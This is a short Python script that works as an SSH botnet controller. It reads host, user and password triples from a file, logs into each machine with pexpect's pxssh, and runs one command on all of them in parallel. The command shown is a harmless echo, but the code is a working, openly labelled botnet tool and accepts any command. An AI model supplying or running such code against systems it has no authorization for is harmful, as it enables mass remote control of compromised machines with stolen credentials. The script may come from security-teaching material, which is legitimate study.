
from pexpect import pxssh
from multiprocessing import Process

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command,client):
    # for client in botNet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' +str(output, encoding='utf-8')+ '\n')

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

order = '"echo "helo""'
botNet = []
for f in open("botlist.txt", "r").readlines():
    result = f.split("$")
    addClient(result[0], result[1], result[2])
for client in botNet:
    session = Process(target=botnetCommand, args=(order,client))
    session.start()
session.join()